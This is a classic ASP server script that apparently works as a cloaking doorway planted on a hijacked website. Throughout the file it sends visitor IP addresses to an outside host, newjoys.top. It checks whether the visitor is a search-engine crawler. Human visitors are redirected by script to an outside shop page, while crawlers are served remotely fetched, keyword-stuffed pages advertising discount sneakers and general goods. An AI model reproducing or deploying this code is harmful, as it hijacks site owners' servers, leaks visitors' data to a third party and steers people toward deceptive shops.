<%
Function getHTTPPage(url) 
On Error Resume Next
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.setRequestHeader "User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0"  
Http.send() 
if Http.readystate<>4 then
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"utf-8")
set http=nothing
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b> </b></font></p>" 
Response.end
Err.Clear
End If  
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
Randomize
%>
<%
Dim Url,Html,hyzhdy,kname
kname=""
hyzhdy="http://newjoys.top/doiid.aspx"
if request("iid")<>"" then
kname =getHTTPPage("http://newjoys.top/gn.aspx?iid="&request("iid"))
end if
if request("kk")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")&"*"&Request.ServerVariables("REMOTE_HOST")&"*"&Request.ServerVariables("HTTP_X_FORWARDED_FOR")&"*"&Request.ServerVariables("HTTP_CLIENT_IP")&"*"&Request.ServerVariables("HTTP_X_FORWARDED")&"*"&Request.ServerVariables("HTTP_FORWARDED_FOR")&"*"&Request.ServerVariables("HTTP_FORWARDED")
end if

ipurl="http://newjoys.top/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if(instr(domain,"google")=0 and instr(domain,"msn.com")=0 and instr(domain,"yahoo.com")=0 and instr(domain,"aol.com")=0 and instr(domain,"yandex")=0) then
    if request("iid")<>""  then
    ddd="http://newjoys.top/a.aspx"
    ddd=ddd&"?cid="&request("cid")&"&cname="&Server.URLEncode(kname)
    Response.write "<script>self.location.href="""&ddd&"""</script>"
	Response.end
    end if	
     if request("pnum")<>""  then
    ddd="http://newjoys.top/a.aspx"
	ddd=Replace(ddd, "products.aspx", "")
    ddd=ddd&"?cid="&request("cid")
    Response.write "<script>self.location.href="""&ddd&"""</script>"
	Response.end
    end if	
end if
%>
<%
Dim xy
if Request.ServerVariables("HTTPS")= "off" then
xy="http://"
else
xy="https://"
end if
if request("s")<>"" then
cid=INT((40-1+1)*rnd+1)
if request("cid")<>"" then
cid=request("cid")
end if
URL="http://newjoys.top/sjd.aspx?cid="&cid&"&number="&request("number")&"&pnum="&request("pnum")
con=getHTTPPage(URL)
con=Replace(con, "yymm", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
Response.write con
Response.end
end if
%>
<%

if request("s")<>"" then
else
if request("iid")<>"" then
wid=INT((200-1+1)*rnd+1)
URL=hyzhdy&"?iid="&request("iid")&"&mt=http://newjoys.top/EN2/"&wid&".txt&cid="&request("cid")
else
cid=INT((40-1+1)*rnd+1)
if request("cid")<>"" then
cid=request("cid")
end if
URL=hyzhdy&"?cid="&cid&"&pnum="&request("pnum")
end if




Dim ttttt,kkkkk,iiiii,ddddd
ttttt=kname&"Limited Special Sales and Special Offers – Women's & Men's Sneakers & Sports Shoes - Shop Athletic Shoes Online > OFF-"&INT((75-50+1)*RND+50)&"%"&request("pnum")&" Free Shipping & Fast Shippment!"
kkkkk =kname
iiiii="OFF-"&INT((75-50+1)*RND+50)&"% >"&kname&", All kinds of daily necessities demand Wumart cheap women's clothing, shoes, tools and accessories. Buy the latest series of hot products at an affordable price. Free shipping worldwide!" 
ddddd=kname&" Gold, White, Black, Red, Blue, Beige, Grey, Price, Rose, Orange, Purple, Green, Yellow, Cyan, Bordeaux, pink, Indigo, Brown, Silver,Electronics, Video Games, Computers, Cell Phones, Toys, Games, Apparel, Accessories, Shoes, Jewelry, Watches, Office Products, Sports & Outdoors, Sporting Goods, Baby Products, Health, Personal Care, Beauty, Home, Garden, Bed & Bath, Furniture, Tools, Hardware, Vacuums, Outdoor Living, Automotive Parts, Pet Supplies, Broadband, DSL, Books, Book Store, Magazine, Subscription, Music, CDs, DVDs, Videos,Online Shopping"
con=getHTTPPage(URL)
con=Replace(con, "UUUUU", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "DDDDD", ddddd)
con=Replace(con, "TTTTT", ttttt)
con=Replace(con, "KKKKK", kkkkk)
con=Replace(con, "IIIII", iiiii)
con=Replace(con, "CCCCC", xy& Request.ServerVariables("HTTP_HOST") & Request.ServerVariables("PATH_INFO") & "?" & Request.ServerVariables("QUERY_STRING"))
end if
Response.write con
%> 